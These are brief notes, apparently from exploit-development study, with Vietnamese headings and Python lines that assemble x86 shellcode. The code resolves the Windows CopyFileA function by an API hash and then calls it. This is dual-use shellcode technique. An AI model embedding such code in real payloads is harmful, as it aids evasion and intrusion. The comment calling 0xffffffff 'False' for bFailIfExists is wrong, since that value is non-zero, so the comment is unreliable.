## Assembly:
### Tìm hàm
```
code += "push 0x99ec895e;" # CopyFileA hash
code += "call dword ptr [ebp+0x4];"
code += "mov [ebp + 0x10], eax;"
```
### Gọi hàm
```
code += "push 0xffffffff;" # bFailIfExists = False
code += "push edi;" # lpNewFileName
code += "push ebx;" # lpExistingFileName
code += "call [ebp + 0x10];"
```
